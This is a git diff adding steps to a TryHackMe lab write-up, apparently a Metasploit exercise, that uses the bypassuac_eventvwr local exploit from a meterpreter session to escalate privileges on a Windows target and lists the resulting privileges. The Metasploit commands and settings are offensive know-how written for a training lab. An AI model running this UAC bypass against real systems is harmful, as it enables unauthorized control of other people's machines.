@@ -126,9 +126,65 @@ x64 under the Architecture.
 
 6. Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
 
-`exploit/windows/local/bypassuac_eventvwr`
+`exploit/windows/local/bypassuac_eventvwr`, I got this answer from the hint.
 
 <img width="845" height="215" alt="image" src="https://github.com/user-attachments/assets/ffedd5c2-cb2c-4ddd-8e64-8b5d4c30321b" />
+
+7. Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.
+
+<img width="239" height="44" alt="image" src="https://github.com/user-attachments/assets/e16af58a-d916-4aeb-9362-71ff96f310b4" />
+
+8. Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`
+
+Write command: `use exploit/windows/local/bypassuac_eventvwr`
+
+<img width="447" height="59" alt="image" src="https://github.com/user-attachments/assets/c9d2cf3a-1c17-4092-9b80-4d22aeb5284a" />
+
+9. Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`
+
+First check by `show options`, we need to set SESSION:
+
+<img width="994" height="595" alt="image" src="https://github.com/user-attachments/assets/925e408e-a487-4e1e-8180-7999c60aa2dd" />
+
+Then set the SESSION by: `set session 1`:
+
+<img width="316" height="41" alt="image" src="https://github.com/user-attachments/assets/81cb8490-79dd-4985-8d0f-172abd2659a8" />
+
+10. Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?
+
+LHOST, as we need to set it with our tun0 IP Address.
+
+11. Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`
+
+You can check your tun0 IP Address by `ifconfig`
+
+Set LHOST by: `set LHOST TUN0_IP`:
+
+<img width="742" height="81" alt="image" src="https://github.com/user-attachments/assets/46d3c15e-95ca-4531-8825-30a57e1f2096" />
+
+12. After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails.
+
+<img width="1099" height="294" alt="image" src="https://github.com/user-attachments/assets/cebae6af-7992-41df-aff6-aba777f64ddb" />
+
+13. Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`
+
+It is already selected as it opened the Meterpreter session 2.
+
+14. We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?
+
+SeTakeOwnershipPrivilege
+
+<img width="176" height="330" alt="image" src="https://github.com/user-attachments/assets/549069c8-4820-461a-9906-18962e30ad8f" />
+
+
+
+
+
+
+
+
+
+
 
 
 
